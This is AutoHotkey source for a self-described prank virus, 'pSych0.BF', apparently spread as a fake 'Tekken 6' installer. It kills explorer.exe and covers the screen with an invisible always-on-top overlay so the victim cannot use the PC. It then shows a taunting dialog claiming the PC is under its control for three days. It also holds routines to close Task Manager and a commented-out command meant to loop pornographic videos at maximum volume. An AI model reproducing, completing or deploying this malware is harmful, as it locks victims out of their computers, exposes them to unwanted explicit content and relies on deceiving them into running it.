/*

   pSych0.BF Virus
   // Core.ahk \\ 

  Author(s):-     pSych0 C0d3r		 &&  
  Contact:-  pSych0.C0d3r@gmail.com      

  Description:- 
	The actual virus: Shows porn videos continuously for 3 days.
	
  [NOTES]:-
	1. Add a function to SelfDestruct() itself after 3 days of usage.
	2. Add a function FilesReady() that checks if the required files 
		exist and if not extracts them from the copied files.
	3. Store every data in registry.
	4. Change Logon behaviour to Welcome Screen
	5. Add a timer to close task manager

*/

#NoEnv  						;Recommended for performance.
#SingleInstance Ignore			;Make Single instance application.
#Persistent						;Keep running until the user asks to exit.
;#NoTrayIcon						;Ensures that no icon is visible.
;SetWorkingDir %A_ScriptDir%		;Ensures a consistent starting directory.
SendMode Input  				;Recommended due to its superior speed and reliability.

;---------  Variables
VirDir = A_WinDir\system32\drivers\etc
IsAdmin := A_UserName = "administrator" or A_UserName = "admin"

;--------- Load Settings from registry
RegRead, ThisDay, HKLM, Software\pSych0, Day
RegRead, FileStatus, HKLM, Software\pSych0, FileStatus
	
;---------  Real Virus Code Begins

	;Make Sure all required files exist
		;if FileStatus = Copied

	;Make sure taskmanager is disabled
		;DisableThings()
		;If (A_UserName = "administrator" or A_UserName = "admin")
			;SetTimer, DisableTaskMgr, 600
	
	;Create an invisble cloak so user can't 'touch' anything
		RunWait, taskkill /f /im explorer.exe, ,Hide
		SplashTextOn, %A_ScreenWidth%, %A_ScreenHeight%, Trans, BlockCloak
		WinSet, Transparent, 1, Trans
		SetTimer, CloakOnTop, 2000

	;Notify user of the day and tell him what is happening to his system
		Gui, -SysMenu
	
		Gui, Add, GroupBox, x6 y10 w410 h100 , What is happening to my PC??
		Gui, Add, Text, x16 y30 w390 h70 , You must have tried to install Tekken 6 for PC.     You DUMB sucker.......`n`nLet me tell you that it was actually a virus pSych0.BF `n`nYou must be thinking why i created it???   My answer is: TO JUST HAVE FUN!!!!!!!
		Gui, Add, GroupBox, x6 y120 w410 h50 , How long will all this continue??
		Gui, Add, Text, x16 y140 w390 h20 , Just 3 more days BABY :) Till then.... HAVE FUNNNNNN
		Gui, Add, GroupBox, x6 y180 w410 h50 , Is there any way to stop it??
		Gui, Add, Text, x16 y200 w390 h20 , Well......... NO.`t`tIt will be gone after 3 days.

		Gui, Show, h240 w424 Center, pSycho.Cod3r has all controls....
		
		Sleep 60000

	;Show VLC with porn video(s)
	;Run, D:\The Software Gallery\[Portable]\VLC\App\vlc\vlc.exe --no-video-title-show --no-osd --high-priority --volume==1024 --loop --no-qt-system-tray --qt-minimal-view --no-qt-name-in-title --qt-volume-complete --no-qt-error-dialogs  --no-qt-updates-notif --qt-updates-days=99 --no-qt-privacy-ask --qt-disable-volume-keys brink.wmv hp.wmv scene.mp4,, Max, VLC_PID


;---------  Virus Code Ends #################
Return  ;End of Core   
;______________________

GuiClose:
Return

!^+x::
	Run, explorer.exe
ExitApp

DisableTaskmgr:
	SetTimer, CloseTaskmgr, off
	Process, Wait, taskmgr.exe, 4
	Process, Close, taskmgr.exe
	SetTimer, CloseTaskmgr, on
Return 

CloakOnTop:
	WinSet, AlwaysOnTop, On, BlockCloak
	SetTimer, CloakOnTop, Off
Return
